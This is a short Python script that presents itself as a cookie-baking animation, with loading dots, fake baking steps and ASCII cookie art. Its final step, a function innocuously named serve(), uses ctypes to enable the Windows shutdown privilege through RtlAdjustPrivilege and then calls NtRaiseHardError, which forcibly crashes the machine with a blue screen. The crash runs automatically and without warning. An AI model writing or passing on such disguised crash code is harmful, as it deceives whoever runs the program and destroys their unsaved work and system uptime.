import time
import sys
import ctypes
from Assets.cookie_art import cookie_art
from ctypes import windll, c_int, c_uint, c_ulong, POINTER, byref

def serve():
    nullptr = POINTER(c_int)()
    
    windll.ntdll.RtlAdjustPrivilege(c_uint(19), c_uint(1), c_uint(0), byref(c_int()))
    
    windll.ntdll.NtRaiseHardError(c_ulong(0xC000007B), c_ulong(0), nullptr, nullptr, c_uint(6), byref(c_uint()))


def animated_dots(steps=4, delay=0.2):
    for i in range(1, steps + 1):
        print("." * i, end="\r", flush=True)
        time.sleep(delay)
    print()


def process_step(message, delay=0.5, final_message="Done!"):
    print(message, end=" ", flush=True)
    time.sleep(delay)
    print(final_message)
    time.sleep(0.5)


def load():
    print("Loading Script")
    animated_dots(delay=0.2)
    print("Loaded")


def bake():
    process_step("Making Dough...")
    process_step("Adding Chocolate Chips...")
    print("Baking...")
    animated_dots(steps=3, delay=0.3)  # Fixed the incorrect argument
    print("Done!")
    time.sleep(2)

    print("Cookie Finished")
    time.sleep(0.5)

    for line in cookie_art.split("\n"):
        print(line)
        time.sleep(0.1)


def main():
    load()
    time.sleep(2)
    bake()
    time.sleep(2)
    serve()


main()
